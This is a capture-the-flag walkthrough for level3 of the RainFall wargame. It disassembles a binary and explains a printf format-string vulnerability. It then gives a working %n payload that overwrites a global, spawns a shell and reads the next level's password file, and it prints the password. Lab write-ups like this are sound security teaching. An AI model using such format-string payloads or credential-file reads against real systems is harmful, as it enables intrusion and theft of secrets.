## level3

```nasm
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x218
=> 0x080484ad <+9>:     mov    eax,ds:0x8049860
   0x080484b2 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:    lea    eax,[ebp-0x208]
   0x080484c4 <+32>:    mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    eax,[ebp-0x208]
   0x080484d2 <+46>:    mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    eax,ds:0x804988c
   0x080484df <+59>:    cmp    eax,0x40
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    eax,ds:0x8049880
   0x080484e9 <+69>:    mov    edx,eax
   0x080484eb <+71>:    mov    eax,0x8048600
   0x080484f0 <+76>:    mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:    mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:    mov    DWORD PTR [esp],eax
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave  
   0x08048519 <+117>:   ret    
End of assembler dump.
```

```c
int m;

void v() {
    char buf[520];

    fgets(buf, 512, stdin);
    printf(buf);
    if (m == 64) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

int main() { v(); }
```

We have to write 64 at the address 0x0804988c to get the reverse shell.

The program uses `printf` with the input directly as a format string. This is a well-known vulnerability, since users can write their own format specifiers, causing the leak of information, or in our case, writing values directly to memory.

The `%n` format specifier in `printf` writes the number of character written so far to a variable. `printf("lol%n", &c)` will write make `c = 3`.

First, we need to detect where is the string given to `printf` on the stack:

```console
level3@RainFall:~$ echo '%x %x %x %x %x' | ./level3
200 b7fd1ac0 b7ff37d0 25207825 78252078
```

There are 3 values, then 257820 repeating corresponding to `%x `. So it is found at the 4th position.

The trick is to start the format string with the address we want to overwrite, then set %n the 4th format specifier. The rest are padding characters to reach a value of 64.

```console
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08%x%x%x.........................................%n')" ; cat) | ./level3
�200.b7fd1ac0.b7ff37d0.......................................
Wait what?!
cat /home/user/level4/.pass                                     
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

